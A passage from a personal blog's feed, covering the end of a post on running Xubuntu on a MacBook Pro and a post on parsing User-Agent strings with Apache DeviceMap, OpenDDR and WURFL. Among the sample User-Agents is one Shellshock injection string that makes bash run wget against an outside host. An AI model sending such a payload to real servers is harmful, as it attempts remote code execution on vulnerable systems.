question. I tried really hard for getting used to the UI interactions. I mean,
it is not that I tried to modify the UI to adopt my old conventions. Instead,
I tried to do it in the &lt;em&gt;OSX way&lt;/em&gt; of doing things. But the desktop was far
from being usable compared to what I had at Xfce, Fluxbox, i3, etc. In
addition to all these interface integration aches, I really got amazed to see
how hard OSX users try to make it look like a GNU/Linux environment: I mean,
you are expected to install a handful of garbage using a blend of tools
varying from brew to DMG, gem to Xcode, etc. just to establish a decent
development environment. The more I used the system, the more I get necessary
confidence to replace OSX with a GNU/Linux distribution, which is Xubuntu for
my case.&lt;/p&gt;

&lt;h1 id="preparation"&gt;Preparation&lt;/h1&gt;

&lt;p&gt;First, I checked the avalability of having a GNU/Linux on this hardware with
ups and downs. &lt;a href="https://help.ubuntu.com/community/MacBookPro"&gt;Installing Ubuntu on a MacBook
Pro&lt;/a&gt; page was really helpful in
this context. There instructions were clean, to the point, and most of the
time produced the expected output for me. Next, while I will keep OSX next
to my GNU/Linux, I take a backup of my local files on OSX just for case of
emergency.&lt;/p&gt;

&lt;h1 id="installation"&gt;Installation&lt;/h1&gt;

&lt;p&gt;As instructed, I first partitioned the current OSX disk into two using Disk
Utility. Just to make sure everything still works, I verified the partition
table and it was looking fine. Then I restarted the machine to make really
sure that everything was fine. And… Boom!&lt;/p&gt;

&lt;p&gt;&lt;img src="question-mark-folder.jpg" alt="OSX Question Mark Folder"&gt;&lt;/p&gt;

&lt;p&gt;And I was introduced to the &lt;em&gt;OSX question mark folder&lt;/em&gt;. No error messages, no
explanations, nothing! That was exactly the same situation that I was driven
away from Microsoft Windows more than a decade ago. God! I did not even know
how to search for this error, since there were no texts or anything on the
screen. Anyway, I tried to describe the image I saw using words on Google and
voila! After wasting a day on various theories related with the error, I
figured out that the problem was caused by the lock on the partition that was
put there by Help Desk guys who handed me the notebook. Damn! I restarted the
system pressing &lt;code&gt;Command+R&lt;/code&gt; and logon to the system in rescue mode and removed
the partition lock. (I needed to go to the Help Desk anyway to get the rescue
mode password.) This time restarting the system led me into OSX without a
glitch.&lt;/p&gt;

&lt;p&gt;The rest of the installation was like taking a candy from a baby, if you know
what I mean. I downloaded the Xubuntu 14.10 into a USB disk, rebooted the
system by pressing &lt;code&gt;Option&lt;/code&gt; key, selected the boot drive and there Ubuntu
installation screen greeted me. At the end of the installation, prior to
restarting the system, I just needed to set the EFI boot order via &lt;code&gt;efibootmgr
-o 0,80&lt;/code&gt; and I was done. Now I could do the rest of the work (adding an entry
for OSX to GRUB, appending &lt;code&gt;libata.force=noncq&lt;/code&gt; to the kernel boot parameters,
etc.) when I logged into my brand new GNU/Linux system! I crossed my fingers
and restarted it system…&lt;/p&gt;

&lt;h1 id="home-sweet-home"&gt;Home! Sweet Home!&lt;/h1&gt;

&lt;p&gt;After restart I directly got forwarded to the Xubuntu boot sequence, that is,
GRUB display was missing. For a second that made me a little bit nervous, but
later I figured out that I can still boot the OSX partition via opening the
machine in rescue mode, hence no worries. After all, I want to get rid of OSX
all together. And when I see the blue Xubuntu loading logo running on the
screen I cannot express my relief and excitement. I installed GNU/Linux on
hundreds of systems, but none gave a joy even close to ditching OSX away.&lt;/p&gt;

&lt;p&gt;As a regular GNU/Linux user, I also am used to live with the fact that Linux
kernel needs a little bit tweaking at each installation. So I started checking
if everything was working.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Keyboard? Checked.&lt;/li&gt;
  &lt;li&gt;Mousepad? Checked.&lt;/li&gt;
  &lt;li&gt;USB mouse? Checked.&lt;/li&gt;
  &lt;li&gt;Sound? Checked.&lt;/li&gt;
  &lt;li&gt;Video card? Checked.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As I get more positive checks my inclination to believe that something serious
will get mess the whole thing up was increasing. I continued…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Wireless network driver? Nope. No worries. &lt;code&gt;aptitude install bcmwl-kernel-source&lt;/code&gt;
did the necessary magic. (Time to time I needed to restart Network Manager
service after getting back from suspend, but that does not hurt much.)&lt;/li&gt;
  &lt;li&gt;Wired network driver? No! I got shocked. Then I further read the
documentation and it’s been told that current Thunderbolt driver does not
provide a plug-and-play support. It is further mentioned that the situation
got better in the most recent kernel version, which I did not find a chance
to try yet. Anyway, I restarted the system with ethernet cable and
Ethernet-to-Thunderbolt adapter plugged in and now I got wired
connection working too.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I must admit that: &lt;em&gt;I had the most smooth GNU/Linux installation experience
that I ever had since years!&lt;/em&gt; Almost everything was working out of the box.
Looking back to days that I was going mad for my 33600 dial-up modem drivers,
display resolution issues… This was really the best. And additionally, now I
have the most poweful (display, processor, memory, storage, etc.) personal
computer hardware under my hands that I have ever touched.&lt;/p&gt;

&lt;p&gt;While I was enjoying my time like a 6 year old getting introduced to his first
computer, I got my first hit: Suspend was not working. I mean, I was closing
the lid, the Apple logo light was going off and coming back after a couple of
seconds. I threw myself into the ocean of Google results again and found out a
quick and dirty fix: Unplugging adapters (USB mouse, Thunderbolt, etc.) before
suspend. It is also mentioned that the problem should have had fixed in newer
kernel versions but I did not give it a try. It was not a major problem for
me, at least not yet.&lt;/p&gt;

&lt;p&gt;By default, the &lt;code&gt;F&lt;/code&gt; keys (&lt;code&gt;F1&lt;/code&gt;, &lt;code&gt;F2&lt;/code&gt;, etc.) serve their traditional function
by pressing the &lt;code&gt;fn&lt;/code&gt; key. For example, by default the &lt;code&gt;F1&lt;/code&gt; key lowers display
brightness and &lt;code&gt;fn+F1&lt;/code&gt; is the traditional &lt;code&gt;F1&lt;/code&gt;. I switched this behavior on all
the &lt;code&gt;F&lt;/code&gt; keys by adding a &lt;code&gt;modprobe&lt;/code&gt; config file
&lt;code&gt;etc/modprobe.d/hid-apple.conf&lt;/code&gt; written &lt;code&gt;options hid-apple fnmode=2&lt;/code&gt; in it.&lt;/p&gt;

&lt;p&gt;&lt;img src="result.jpg" alt="Xubuntu on Macbook Pro 11"&gt;&lt;/p&gt;

&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;As you might have guessed, I wrote this blog post in the aforementioned
Xubuntu running on a Macbook Pro 11. So far my experience was totally
satisfying and I believe the issues arised will disappear with a newer kernel
version, of which I do not have power and time to invest right now. In
conclusion, Macbook Pro is certainly a powerful hardware as a GNU/Linux
development platform and I can heartly recommend it to anybody.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2014-12-05://blog/post/2014/12/05/apache-devicemap/</id>
    <title type="html">Parsing User-Agent Strings with Apache DeviceMap</title>
    <published>2014-12-05T17:42:00Z</published>
    <updated>2014-12-05T17:42:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2014/12/05/apache-devicemap/"/>
    <content type="html">
&lt;p&gt;At work I am given the task of implementing a basic device profiler service to
classify the incoming HTTP requests into a certain set of groups (desktop,
tablet, mobile, etc.) using the
&lt;a href="http://en.wikipedia.org/wiki/User_agent"&gt;User-Agent&lt;/a&gt; header. It opens a
multitude of new dimensions both at the client- and server-side for interface
and content customizations tailored to the device. For instance, you can
disable some of your fancy gestures (e.g., &lt;code&gt;mouseover&lt;/code&gt; events) that will not
be properly used on a touch screen. Or you might want to prioritize console
games for a client who uses a PlayStation to browse your shop.&lt;/p&gt;

&lt;p&gt;I first tried to investigate and (if possible) evaluate the existing solutions
in the wild, including the commercial ones. And eventually decided to go with
&lt;a href="http://devicemap.apache.org/"&gt;Apache DeviceMap&lt;/a&gt; that employs
&lt;a href="https://github.com/OpenDDRdotORG/OpenDDR-Resources"&gt;OpenDDR&lt;/a&gt; in the
background. In this blog post, I tried to wrap up a summary of the
&lt;em&gt;experience&lt;/em&gt; I collected through out this pursuit.&lt;/p&gt;

&lt;h1 id="parsing-a-user-agent-string"&gt;Parsing a User-Agent string&lt;/h1&gt;

&lt;p&gt;While &lt;a href="http://tools.ietf.org/html/rfc7231#section-5.5.3"&gt;Section 5.5.3&lt;/a&gt; of
&lt;em&gt;HTTP/1.1: Semantics and Content&lt;/em&gt; specification has a lot to say about the
formatting of the User-Agent header, the first thing for sure is that there
are no restrictive rules that shape the header in a machine-readable format.
Consider the following examples:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mozilla/5.0 (Linux; Android 4.2.1; GT-H9500 Build/JOP40D) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/36.0.1985.131 Mobile Safari/537.36&lt;/li&gt;
  &lt;li&gt;Mozilla/5.0 (PlayStation Vita 3.18) AppleWebKit/536.26 (KHTML, like Gecko)
Silk/3.2&lt;/li&gt;
  &lt;li&gt;Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-B5510B Build/GINGERBREAD)&lt;/li&gt;
  &lt;li&gt;Opera/9.50 (Nintendo DSi; Opera/507; U; en-GB)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I can even show you more fancier ones:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;MIKI50_6464_11B_24MP_HW
(MRE/3.0.00(800);MAUI/51TV_V01_01_130227;BDATE/2013/02/27
19:19;LCD/320240;CHIP/MT6250;KEY/QWERT;TOUCH/0;CAMERA/1;SENSOR/0;DEV/MIKI50_6464_11B_24MP_HW;WAP
Browser/MAUI
(HTTPS);GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;K)
RLG_G51TV_V01_01_130227 Release/2013.02.27 WAP Browser/MAUI (HTTPS) Profile/
Q03C1-2.40 en-US&lt;/li&gt;
  &lt;li&gt;Apache-HttpClient/4.1.3 (java 1.5)&lt;/li&gt;
  &lt;li&gt;WWW-Mechanize/1.73&lt;/li&gt;
  &lt;li&gt;Java/1.6.0_22&lt;/li&gt;
  &lt;li&gt;Scrapy/0.24.4 (+http://scrapy.org)&lt;/li&gt;
  &lt;li&gt;WordPress/3.1.3; http://www.unileverventures.com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And some annoying ones:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;LAVA.DISCOVER 137*.HEXING60A_COSMOS_11B_HW
(MRE/3.1.00(1500);MAUI/308;BDATE/2013/11/20
11:14;LCD/320480;CHIP/MT6260;KEY/Reduced;TOUCH/1;CAMERA/0;SENSOR/0;DEV/HEXING60A_COSMOS_11B_HW;WAP
Browser/MAUI (HTTP
PGDL;HTTPS);GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;KKF)
11BW1308 Release/2013.11.20 WAP Browser/MAUI (HTTP PGDL; HTTPS)
Profile/Profile/MIDP-2.0 Configuration/CLDC-1.1 Q03C1-2.40 en-US&lt;/li&gt;
  &lt;li&gt;shellshocker=’() { wget
http://yourschool.net/.tmp/frogclog.php?http://www.ebay.com/ago-rari-1-43/1004004009042189/;
}’ bash -c shellshocker&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So making a conclusion on which part denotes the product name, version, etc.
is a fuzzy, tedious and error-prone task. That being said, there is another
thing we can do here! Every User-Agent is more or less unique to the device
that the software runs on. Hence, if we can come up with a database such that
User-Agent strings are mapped to devices, we can employ this database to find
the device of a certain User-Agent. This is where the term &lt;a href="http://en.wikipedia.org/wiki/Device_Description_Repository"&gt;Device Description
Repository&lt;/a&gt; (DDR)
kicks in:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Device Description Repository is a concept proposed by the Mobile Web
Initiative Device Description Working Group (DDWG) of the World Wide Web
Consortium. The DDR is supported by a standard interface and an initial core
vocabulary of device properties. Implementations of the proposed repository
are expected to contain information about Web-enabled devices (particularly
mobile devices).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id="the-rise-of-ddr"&gt;The Rise of DDR&lt;/h1&gt;

&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/WURFL"&gt;WURFL&lt;/a&gt; (Wireless Universal Resource FiLe)
was the first community effort focused on mobile device detection and dates
back to 2007. While WURFL was initially released under an “open source /
public domain” license, in June 2011, project’s founders formed ScientiaMobile
to provide commercial mobile device detection support and services using
WURFL. As of now, the &lt;a href="http://www.scientiamobile.com/"&gt;ScientiaMobile&lt;/a&gt; WURFL
APIs are licensed under a dual-license model, using the AGPL license for
non-commercial use and a proprietary commercial license. In a world dominated
by capitalism, the current version of the WURFL database itself is no longer
open source. Inspired by WURFL and motivated by the gap in the market, it did
not take much for alternative companies to emerge, including, but is not
limited to, &lt;a href="https://deviceatlas.com/"&gt;DeviceAtlas&lt;/a&gt;, &lt;a href="http://www.handsetdetection.com/"&gt;Handset
Detection&lt;/a&gt;, and
&lt;a href="http://51degrees.com/"&gt;51degrees&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So how far one can go using a DDR to detect the properties of a device by just
looking at the User-Agent header? Below is a sample output that I collected
from &lt;a href="http://51degrees.com/"&gt;51degrees&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HardwarePlatform
    &lt;ul&gt;
      &lt;li&gt;Camera
        &lt;ul&gt;
          &lt;li&gt;Has3DCamera: False&lt;/li&gt;
          &lt;li&gt;HasCamera: False&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Connectivity
        &lt;ul&gt;
          &lt;li&gt;HasNFC: False&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Device
        &lt;ul&gt;
          &lt;li&gt;DeviceType: Desktop&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Inputs
        &lt;ul&gt;
          &lt;li&gt;HasKeypad: False&lt;/li&gt;
          &lt;li&gt;HasQwertyPad: True&lt;/li&gt;
          &lt;li&gt;HasTouchScreen: False&lt;/li&gt;
          &lt;li&gt;HasTrackPad: True&lt;/li&gt;
          &lt;li&gt;HasVirtualQwerty: False&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Name
        &lt;ul&gt;
          &lt;li&gt;HardwareFamily: Macintosh&lt;/li&gt;
          &lt;li&gt;HardwareModel: Macintosh&lt;/li&gt;
          &lt;li&gt;HardwareName: Macintosh&lt;/li&gt;
          &lt;li&gt;HardwareVendor: Apple&lt;/li&gt;
          &lt;li&gt;OEM: Apple&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Screen
        &lt;ul&gt;
          &lt;li&gt;Has3DScreen: False&lt;/li&gt;
          &lt;li&gt;ScreenInchesDiagonalRounded: Unknown&lt;/li&gt;
          &lt;li&gt;ScreenInchesSquare: Unknown&lt;/li&gt;
          &lt;li&gt;ScreenMMDiagonalRounded: Unknown&lt;/li&gt;
          &lt;li&gt;ScreenMMSquare: Unknown&lt;/li&gt;
          &lt;li&gt;SuggestedImageButtonHeightMms: 3.5&lt;/li&gt;
          &lt;li&gt;SuggestedImageButtonHeightPixels: 11.8&lt;/li&gt;
          &lt;li&gt;SuggestedLinkSizePixels: 11.8&lt;/li&gt;
          &lt;li&gt;SuggestedLinkSizePoints: 10&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Stats
        &lt;ul&gt;
          &lt;li&gt;Popularity: 1674140546&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Tv
        &lt;ul&gt;
          &lt;li&gt;ContrastRatio: N/A&lt;/li&gt;
          &lt;li&gt;EnergyConsumptionPerYear: N/A&lt;/li&gt;
          &lt;li&gt;OnPowerConsumption: N/A&lt;/li&gt;
          &lt;li&gt;RefreshRate: N/A&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Miscellaneous
        &lt;ul&gt;
          &lt;li&gt;HardwareImages: Front, Posed&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SoftwarePlatform
    &lt;ul&gt;
      &lt;li&gt;Ccpp
        &lt;ul&gt;
          &lt;li&gt;CcppAccept: application/java, application/java-archive,
application/vnd.oma.dd+xml, application/vnd.oma.drm.content,
application/vnd.oma.drm.message,
application/vnd.oma.drm.rights+wbxml,
application/vnd.oma.drm.rights+xml,
application/vnd.wap.multipart.mixed, application/vnd.wap.wbxml,
application/vnd.wap.wmlscriptc, application/vnd.wap.xhtml+xml,
application/x-compress, application/x-gzip, application/xhtml+xml,
audio/3ga, audio/3gpp, audio/aac, audio/amr, audio/asf, audio/asx,
audio/awb, audio/m4a, audio/m4b, audio/midi, audio/mp3, audio/mp3d,
audio/mp4, audio/MP4A-ES, audio/MP4A-LATM, audio/wav, audio/wma,
image/2bp, image/bmp, image/gif, image/jpeg, image/jpg, image/png,
image/tif, image/tiff, image/vnd.wap.wbmp, image/wbmp,
message/rfc822, text/css, text/html, text/plain,
text/vnd.sun.j2me.app-descriptor, text/vnd.wap.wml, text/x-ical,
text/xml, text/xsl, text/x-vcal, video/3g2, video/3gp, video/3gpp,
video/divx, video/flv, video/H263-2000, video/H264, video/m4v,
video/mp4, video/MP4V-ES, video/wmv, video/xvid&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Name
        &lt;ul&gt;
          &lt;li&gt;PlatformName: Mac OS X&lt;/li&gt;
          &lt;li&gt;PlatformVendor: Apple&lt;/li&gt;
          &lt;li&gt;PlatformVersion: 10.9&lt;/li&gt;
          &lt;li&gt;BrowserUA: - Css&lt;/li&gt;
          &lt;li&gt;CssBackground: True&lt;/li&gt;
          &lt;li&gt;CssBorderImage: True&lt;/li&gt;
          &lt;li&gt;CssCanvas: True&lt;/li&gt;
          &lt;li&gt;CssColor: True&lt;/li&gt;
          &lt;li&gt;CssColumn: False&lt;/li&gt;
          &lt;li&gt;CssFlexbox: True&lt;/li&gt;
          &lt;li&gt;CssFont: True&lt;/li&gt;
          &lt;li&gt;CssImages: False&lt;/li&gt;
          &lt;li&gt;CssMediaQueries: True&lt;/li&gt;
          &lt;li&gt;CssMinMax: True&lt;/li&gt;
          &lt;li&gt;CssOverflow: True&lt;/li&gt;
          &lt;li&gt;CssPosition: True&lt;/li&gt;
          &lt;li&gt;CssText: False&lt;/li&gt;
          &lt;li&gt;CssTransforms: True&lt;/li&gt;
          &lt;li&gt;CssTransitions: True&lt;/li&gt;
          &lt;li&gt;CssUI: False&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Data
        &lt;ul&gt;
          &lt;li&gt;DataSet: True&lt;/li&gt;
          &lt;li&gt;DataUrl: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;DOM
        &lt;ul&gt;
          &lt;li&gt;DeviceOrientation: False&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;File
        &lt;ul&gt;
          &lt;li&gt;FileReader: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;General
        &lt;ul&gt;
          &lt;li&gt;AjaxRequestType: Standard&lt;/li&gt;
          &lt;li&gt;AnimationTiming: True&lt;/li&gt;
          &lt;li&gt;BlobBuilder: True&lt;/li&gt;
          &lt;li&gt;BrowserPropertySource: Caniuse&lt;/li&gt;
          &lt;li&gt;FormData: True&lt;/li&gt;
          &lt;li&gt;Iframe: True&lt;/li&gt;
          &lt;li&gt;IndexedDB: True&lt;/li&gt;
          &lt;li&gt;jQueryMobileSupport: A-Grade&lt;/li&gt;
          &lt;li&gt;LayoutEngine: Blink&lt;/li&gt;
          &lt;li&gt;Masking: False&lt;/li&gt;
          &lt;li&gt;PostMessage: True&lt;/li&gt;
          &lt;li&gt;Prompts: True&lt;/li&gt;
          &lt;li&gt;Selector: True&lt;/li&gt;
          &lt;li&gt;TouchEvents: True&lt;/li&gt;
          &lt;li&gt;Track: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;GPS
        &lt;ul&gt;
          &lt;li&gt;GeoLocation: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Html
        &lt;ul&gt;
          &lt;li&gt;Html-Media-Capture: True&lt;/li&gt;
          &lt;li&gt;HtmlVersion: 5.0&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Javascript
        &lt;ul&gt;
          &lt;li&gt;Javascript: True&lt;/li&gt;
          &lt;li&gt;JavascriptCanManipulateCSS: True&lt;/li&gt;
          &lt;li&gt;JavascriptCanManipulateDOM: True&lt;/li&gt;
          &lt;li&gt;JavascriptGetElementById: True&lt;/li&gt;
          &lt;li&gt;JavascriptSupportsEventListener: True&lt;/li&gt;
          &lt;li&gt;JavascriptSupportsEvents: True&lt;/li&gt;
          &lt;li&gt;JavascriptSupportsInnerHtml: True&lt;/li&gt;
          &lt;li&gt;JavascriptVersion: 1.8.5&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;JSON
        &lt;ul&gt;
          &lt;li&gt;Json: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Name
        &lt;ul&gt;
          &lt;li&gt;BrowserName: Chrome&lt;/li&gt;
          &lt;li&gt;BrowserVendor: Google&lt;/li&gt;
          &lt;li&gt;BrowserVersion: 38&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Screen
        &lt;ul&gt;
          &lt;li&gt;Fullscreen: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Supported Media
        &lt;ul&gt;
          &lt;li&gt;SupportsTls/Ssl: True&lt;/li&gt;
          &lt;li&gt;Svg: True&lt;/li&gt;
          &lt;li&gt;Video: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ViewPort
        &lt;ul&gt;
          &lt;li&gt;Viewport: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Web
        &lt;ul&gt;
          &lt;li&gt;CookiesCapable: True&lt;/li&gt;
          &lt;li&gt;History: True&lt;/li&gt;
          &lt;li&gt;Progress: True&lt;/li&gt;
          &lt;li&gt;WebWorkers: True&lt;/li&gt;
          &lt;li&gt;Xhr2: True&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Crawler
    &lt;ul&gt;
      &lt;li&gt;Miscellaneous
        &lt;ul&gt;
          &lt;li&gt;IsCrawler: False&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Per see, what they can get by just looking at your User-Agent header is (to put
it mildly) &lt;em&gt;a lot&lt;/em&gt;!&lt;/p&gt;

&lt;h1 id="long-live-foss"&gt;Long live F/OSS!&lt;/h1&gt;

&lt;p&gt;As usual, community’s response did not take long and the most recent open
source version of WURFL (dating back to 2011) is forked under the
&lt;a href="https://github.com/OpenDDRdotORG/OpenDDR-Resources"&gt;OpenDDR&lt;/a&gt; project. Later
on, community kept updating the database by the effort of individual
contributors.&lt;/p&gt;

&lt;p&gt;While OpenDDR file format allows hierarchical device representation as in
WURFL, it rather maps each device to a set of attributes explicitly. To make a
comparison, see how WURFL takes advantage of its hierarchical device
representation:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-xml"&gt;&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (04"&lt;/span&gt;
        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_generic"&lt;/span&gt;
        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;group&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"ui"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;capability&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"table_support"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"false"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 
    &lt;span class="nt"&gt;&amp;lt;/group&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (04.67)"&lt;/span&gt;
        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;
        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub467"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 

&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (04.69)"&lt;/span&gt;
        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;
        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub469"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 

&lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (04.94)"&lt;/span&gt;
        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;
        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub494"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 

&lt;span class="c"&gt;&amp;lt;!-- 7110 new-age --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (05"&lt;/span&gt;
        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1"&lt;/span&gt;
        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver2"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;group&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"ui"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;capability&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"table_support"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt; 
    &lt;span class="nt"&gt;&amp;lt;/group&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (05.00)"&lt;/span&gt;
        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver2"&lt;/span&gt; 
        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub500"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;user_agent=&lt;/span&gt;&lt;span class="s"&gt;"Nokia7110/1.0 (05.01)"&lt;/span&gt;
        &lt;span class="na"&gt;fall_back=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver2"&lt;/span&gt;
        &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"nokia_7110_ver1_sub501"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the other hand, OpenDDR follows a more flat model:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-xml"&gt;&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"SAMSUNG-SGH-i780"&lt;/span&gt; &lt;span class="na"&gt;parentId=&lt;/span&gt;&lt;span class="s"&gt;"genericSamsung"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
